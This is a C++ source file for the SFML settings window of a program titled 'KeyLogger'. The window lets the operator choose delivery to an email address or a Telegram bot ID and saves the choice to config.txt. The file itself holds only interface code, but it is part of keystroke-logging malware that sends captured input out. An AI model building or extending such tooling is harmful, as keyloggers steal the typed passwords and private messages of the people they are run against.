#include "GUI.h"

std::map<std::string, std::string> spesialSimbols{
    std::pair<std::string, std::string>{"1", "!"},
    std::pair<std::string, std::string>{"2", "@"},
    std::pair<std::string, std::string>{"3", "#"},
    std::pair<std::string, std::string>{"4", "$"},
    std::pair<std::string, std::string>{"5", "%"},
    std::pair<std::string, std::string>{"6", "^"},
    std::pair<std::string, std::string>{"7", "&"},
    std::pair<std::string, std::string>{"8", "*"},
    std::pair<std::string, std::string>{"9", "("},
    std::pair<std::string, std::string>{"0", ")"},
    std::pair<std::string, std::string>{"=", "+"},
    std::pair<std::string, std::string>{"-", "_"}
};

void GUI::run()
{
    const int WIDTH_WINDOW = 600;
    const int HEIGHT_WINDOW = 600;
    bool checkedStatusEmail = false;
    bool checkedStatusTG = false;                          
    sf::RenderWindow window(sf::VideoMode(WIDTH_WINDOW, HEIGHT_WINDOW), "KeyLogger", sf::Style::Close);
    window.setVerticalSyncEnabled(true);
    sf::Texture unchecked;
    if (!unchecked.loadFromFile("assets/unchecked.png")) {
        return;
    }
    sf::Sprite emailSprite(unchecked);
    emailSprite.setPosition(0, 0);
    emailSprite.setScale(0.2, 0.2);

    sf::Texture checked;
    if (!checked.loadFromFile("assets/checkbox.png")) {
        return;
    }
    sf::Sprite TGSprite(unchecked);
    TGSprite.setPosition(0, 120);
    TGSprite.setScale(0.2, 0.2);

    sf::Font font;
    if (!font.loadFromFile("assets/arial.ttf"))
    {
        return;
    }

    sf::Text text1(L"Отправка на email", font, 24);
    text1.setFillColor(sf::Color::Black);
    text1.setStyle(sf::Text::Bold | sf::Text::Underlined);
    text1.setPosition(100, 30);

    sf::Text text2(L"Отправка в Telegram бота", font, 24);
    text2.setFillColor(sf::Color::Red);
    text2.setStyle(sf::Text::Bold | sf::Text::Underlined);
    text2.setPosition(100, 150);

    sf::Texture ok;
    if (!ok.loadFromFile("assets/ok-button-png-md.png")) {
        return;
    }

    sf::Texture okHover;
    if (!okHover.loadFromFile("assets/ok-button-png-md-hover.png")) {
        return;
    }

    sf::Sprite okSprite(ok);
    okSprite.setScale(0.5, 0.5);
    float xbtn = WIDTH_WINDOW / 2 - okSprite.getTexture()->getSize().x * okSprite.getScale().x / 2;
    okSprite.setPosition(xbtn, 400);

    Input input1(310, 20);
    Input input2(400, 140);

    sf::Texture aboutUnPressed;
    if (!aboutUnPressed.loadFromFile("assets/info.png")) {
        return;
    }

    sf::Texture aboutPressed;
    if (!aboutPressed.loadFromFile("assets/info-hover.png")) {
        return;
    }

    sf::Sprite aboutSpr(aboutUnPressed);
    aboutSpr.setScale(0.2, 0.2);
    aboutSpr.setPosition(10, 400);

    sf::Text textAlert(L"", font, 16);
    textAlert.setPosition(xbtn, 350);

    while (window.isOpen())
    {
        sf::Event event;
        while (window.pollEvent(event))
        {
            if (event.type == sf::Event::Closed)
                window.close();
            else if (sf::Mouse::isButtonPressed(sf::Mouse::Left)) {
                sf::Vector2i mousePosition = sf::Mouse::getPosition(window);
                sf::Vector2f mousePositionF(static_cast<float> (mousePosition.x), static_cast<float> (mousePosition.y));
                if (emailSprite.getGlobalBounds().contains(mousePositionF)) {
                    emailSprite.setTexture(checkedStatusEmail ? unchecked : checked);
                    checkedStatusEmail = !checkedStatusEmail;
                }
                else if (TGSprite.getGlobalBounds().contains(mousePositionF)) {
                    TGSprite.setTexture(checkedStatusTG ? unchecked : checked);
                    checkedStatusTG = !checkedStatusTG;
                }
                else if (input1.getGlobalBound().contains(mousePositionF)) {
                    input1.setActive();
                    input2.dActive();
                }
                else if (input2.getGlobalBound().contains(mousePositionF)) {
                    input2.setActive();
                    input1.dActive();
                }
                else if (aboutSpr.getGlobalBounds().contains(mousePositionF)) {
                    /*std::thread infoWindowThread(InfoWindow::run, std::ref(window));
                    infoWindowThread.join();*/
                    InfoWindow::run(window);
                }
                else if (okSprite.getGlobalBounds().contains(mousePositionF)) {
                    std::string t1 = input1.getText();
                    std::string t2 = input2.getText();
                    std::regex digitsRegex = std::regex("[0-9]+");
                    std::regex emailRegex = std::regex("([_a-z0-9-]+(\.[_a-z0-9-]+)*@[a-z0-9-]+(\.[a-z0-9-]+)*(\.[a-z]{2,4}))");
                    if (!checkedStatusEmail && !checkedStatusTG) {
                        textAlert.setString(L"Выберите хотя бы один из пунктов");
                        textAlert.setFillColor(sf::Color::Red);
                    }
                    else if (std::regex_match(t1, emailRegex) && checkedStatusEmail && std::regex_match(t2, digitsRegex) && checkedStatusTG || 
                        std::regex_match(t1, emailRegex) && checkedStatusEmail && !checkedStatusTG || std::regex_match(t2, digitsRegex) && checkedStatusTG && !checkedStatusEmail) {
                        textAlert.setString(L"Программа работает!");
                        textAlert.setFillColor(sf::Color::Green);
                        std::ofstream f;
                        f.open("config.txt");
                        if (f.is_open()) {
                            if (checkedStatusEmail) {
                                f << input1.getText() << std::endl;
                            }
                            else {
                                f << "0" << std::endl;
                            }
                            if (checkedStatusTG) {
                                f << input2.getText() << std::endl;
                            }
                            else {
                                f << "0" << std::endl;
                            }
                        }
                        f.close();
                    }
                    else {
                        textAlert.setString(L"Некорректные данные!");
                        textAlert.setFillColor(sf::Color::Red);
                    }
                }
            }
            else if (event.type == sf::Event::MouseMoved) {
                sf::Vector2i mousePosition = sf::Mouse::getPosition(window);
                sf::Vector2f mousePositionF(static_cast<float> (mousePosition.x), static_cast<float> (mousePosition.y));
                if (okSprite.getGlobalBounds().contains(mousePositionF)) {
                    okSprite.setTexture(okHover);
                }
                else {
                    okSprite.setTexture(ok);
                }
                if (aboutSpr.getGlobalBounds().contains(mousePositionF)) {
                    aboutSpr.setTexture(aboutPressed);
                }
                else {
                    aboutSpr.setTexture(aboutUnPressed);
                }
            }
            else if (event.type == sf::Event::KeyPressed && event.key.scancode >= sf::Keyboard::Scan::Scancode::A && 
                     event.key.scancode <= sf::Keyboard::Scan::Scancode::Z) {
                std::string str = sf::Keyboard::getDescription(event.key.scancode).toAnsiString();
                if (!event.key.shift && event.key.scancode >= sf::Keyboard::Scan::Scancode::A &&
                    event.key.scancode <= sf::Keyboard::Scan::Scancode::Z) {
                    str[0] = str[0] + 32;
                }
                if (input1.isActive()) {
                    input1.changeText(str);
                }
                else if (input2.isActive()) {
                    input2.changeText(str);
                }
            }
            else if (event.type == sf::Event::KeyPressed && event.key.scancode == sf::Keyboard::Scan::Scancode::Backspace) {
                if (input1.isActive()) {
                    input1.remLast();
                }
                else if (input2.isActive()) {
                    input2.remLast();
                }
            }
            else if (event.type == sf::Event::KeyPressed && event.key.scancode >= sf::Keyboard::Scan::Scancode::Num1 &&
                event.key.scancode <= sf::Keyboard::Scan::Scancode::Num0) {
                std::string str_digit = sf::Keyboard::getDescription(event.key.scancode).toAnsiString();
                if (input1.isActive()) {
                    if (event.key.shift) {
                        input1.changeText(spesialSimbols[str_digit]);
                    }
                    else {
                        input1.changeText(str_digit);
                    }
                }
                else if (input2.isActive()) {
                    if (event.key.shift) {
                        input2.changeText(spesialSimbols[str_digit]);
                    }
                    else {
                        input2.changeText(str_digit);
                    }
                }
            }
            else if (event.type == sf::Event::KeyPressed && event.key.scancode == sf::Keyboard::Scan::Scancode::Equal ||
                event.key.scancode == sf::Keyboard::Scan::Scancode::Hyphen) {
                std::string str_digit = sf::Keyboard::getDescription(event.key.scancode).toAnsiString();
                if (input1.isActive()) {
                    if (event.key.shift) {
                        input1.changeText(spesialSimbols[str_digit]);
                    }
                    else if (!event.key.shift) {
                        input1.changeText(str_digit);
                    }
                }
                else if (input2.isActive()) {
                    if (event.key.shift) {
                        input2.changeText(spesialSimbols[str_digit]);
                    }
                    else if (!event.key.shift) {
                        input2.changeText(str_digit);
                    }
                }
            }
            else if (event.type == sf::Event::KeyPressed && event.key.scancode == sf::Keyboard::Scan::Scancode::Period) {
                std::string str_digit = sf::Keyboard::getDescription(event.key.scancode).toAnsiString();
                if (input1.isActive()) {
                    input1.changeText(str_digit);
                }
                else if (input2.isActive()) {
                    input2.changeText(str_digit);
                }
            }     
        }

        window.clear(sf::Color::White);
        window.draw(emailSprite);
        window.draw(TGSprite);
        window.draw(okSprite);
        window.draw(text1);
        window.draw(text2);
        window.draw(textAlert);
        window.draw(input1);
        window.draw(input2);
        window.draw(aboutSpr);
        window.display();
    }
}
